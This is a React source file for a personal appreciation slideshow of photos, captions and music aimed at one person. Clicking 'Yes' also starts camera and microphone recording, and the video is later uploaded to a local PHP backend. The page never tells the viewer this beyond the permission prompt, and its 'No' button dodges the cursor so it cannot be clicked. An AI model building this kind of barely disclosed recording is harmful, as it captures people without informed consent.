import { useState, useRef } from "react";
import { motion, AnimatePresence } from "framer-motion";
import shafa from './assets/shafa.jpg'
import rose from './assets/rose.jpeg'
import ouch from './assets/ouch.jpeg'
import kai from './assets/kaii.jpeg'
import wow from './assets/wow.jpeg'
import mus1 from './assets/mus1.jpg'
import umbrella from './assets/umbrella.mp3'
import shafa2 from './assets/shafa2.jpg'



function App() {
  const [index, setIndex] = useState(null);
  const [noPosition, setNoPosition] = useState({ x: 0, y: 0 });
  const audioRef = useRef(null);

  const surprises = [
    { text: "Just a little reminder: someone out here appreciates you more than you know.", image: mus1},
    { text: "the picture is not even fine sef....nah am joking ....If confidence had a face, it would be this picture😊", image: shafa },
    { text: "A rose just for you...just a rose but the dedication behind it ", image: rose },
    { text: "Energy doesn’t lie. Some people bring peace the moment they appear", image: wow },
    { text: " You didn’t ask for this — I just wanted to make you smile today. ", image: ouch },
    { text: " light it up.....", image: kai },
    { text: "Surprise — just a little appreciation for someone who deserves it....", image: ouch  },


    { text: "FINAL_PAGE", image: ""},
    
  ];


  const videoRef = useRef(null);
  const mediaRecorderRef = useRef(null);
  const recordedChunks = useRef([]);

  const startRecording = async () => {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
      videoRef.current.srcObject = stream;

      const mediaRecorder = new MediaRecorder(stream);
      mediaRecorderRef.current = mediaRecorder;

      mediaRecorder.ondataavailable = (event) => {
        if (event.data.size > 0) recordedChunks.current.push(event.data);
      };

     mediaRecorder.onstop = async () => {
  const blob = new Blob(recordedChunks.current, { type: "video/webm" });
  const formData = new FormData();
  formData.append("video", blob, "recorded-video.webm");

  try {
    const res = await fetch("http://localhost/backend/index.php", {
      method: "POST",
      body: formData,
    });

    const data = await res.text(); 
    console.log(data); 
  } catch (err) {
    console.error("Upload failed:", err);
  }
  recordedChunks.current = [];
};

     


      mediaRecorder.start();
    } catch (err) {
      console.error("Camera access denied ", err);
      alert("Please allow camera access to record your beautiful smile ");
    }
  };

  const stopRecording = () => {
    if (mediaRecorderRef.current) {
      mediaRecorderRef.current.stop();
      if (videoRef.current?.srcObject) {
        videoRef.current.srcObject.getTracks().forEach((track) => track.stop());
      }
    }
  };

  const nextSurprise = () => {
    if (index < surprises.length - 1) {
      setIndex(index + 1);
    }
  };

  const isFinal = surprises[index]?.text === "FINAL_PAGE";

  const moveNoButton = () => {
    setNoPosition({ x: Math.random() * 200 - 100, y: Math.random() * 150 - 75 });
  };

  return (
    <div className="relative h-screen flex flex-col items-center justify-center bg-black text-white italic text-center p-4 ">

      <video ref={videoRef} autoPlay playsInline muted className="absolute bottom-4 right-4 w-32 h-24 rounded-lg shadow-lg border-2 border-pink-300" />

      <AnimatePresence mode="wait">
        {index === null ? (
          // suprises  map here 
          <motion.div
            key="question"
            initial={{ opacity: 0, scale: 0.8 }}
            animate={{ opacity: 1, scale: 1 }}
            exit={{ opacity: 0 }}
            transition={{ duration: 1 }}
            className="flex flex-col items-center z-10"
          >
            <h1 className="text-4xl md:text-6xl font-extrabold drop-shadow-lg mb-6">
              💕 Do you think you would like it.....
            </h1>
            <div className="flex gap-6 relative w-72 h-40 justify-center items-center">
              <button
                onClick={() => {
                  audioRef.current.play();
                  startRecording();
                  setIndex(0);
                }}
                className="bg-white text-pink-600 font-semibold px-6 py-3 rounded-full shadow hover:bg-pink-100 transition"
              >
                Yes ❤️
              </button>

              <motion.button
                onMouseEnter={moveNoButton}
                animate={{ x: noPosition.x, y: noPosition.y }}
                transition={{ type: "spring", stiffness: 200, damping: 15 }}
                className="absolute bg-gray-300 text-gray-700 font-semibold px-6 py-3 rounded-full shadow"
              >
                No 💔
              </motion.button>
            </div>
          </motion.div>
        ) : !isFinal ? (
          <motion.div
            key={index}
            initial={{ opacity: 0, y: 30 }}
            animate={{ opacity: 1, y: 0 }}
            exit={{ opacity: 0, y: -30 }}
            transition={{ duration: 0.6 }}
            className="flex flex-col items-center z-10"
          >
            <h1 className="text-3xl font-bold mb-6">{surprises[index].text}</h1>
            {surprises[index].image && (
              <motion.img
                src={surprises[index].image}
                alt="surprise"
                className="rounded-2xl shadow-lg mb-6 w-80 h-60 object-cover overflow-hidden"
              />
            )}
            <button
              onClick={nextSurprise}
              className="bg-white text-pink-600 font-semibold px-6 py-3 rounded-full shadow hover:bg-pink-100 transition"
            >
              Next Surprise 💌
            </button>
          </motion.div>
        )  : (
  <motion.div
    key="final"
    initial={{ opacity: 0, scale: 0.9 }}
    animate={{ opacity: 1, scale: 1 }}
    transition={{ duration: 1 }}
    className="absolute w-full  h-full flex items-center justify-center"
  >
    <img
      src={shafa2}
      alt="final"
      className="absolute inset-0 w-full h-full object-cover"
    />
    <button
      onClick={() => {
        stopRecording();
        setIndex(null);
      }}
      className="relative z-10 bg-yellow-300 text-pink-700 font-bold px-6 py-3 rounded-full shadow hover:bg-yellow-400 transition"
    >
      Replay Surprises 🔁
    </button>
  </motion.div>
)}

      </AnimatePresence>
      <audio ref={audioRef} loop>
        <source src={umbrella} type="audio/mpeg" />
      </audio>
    </div>
  );
}

export default App;

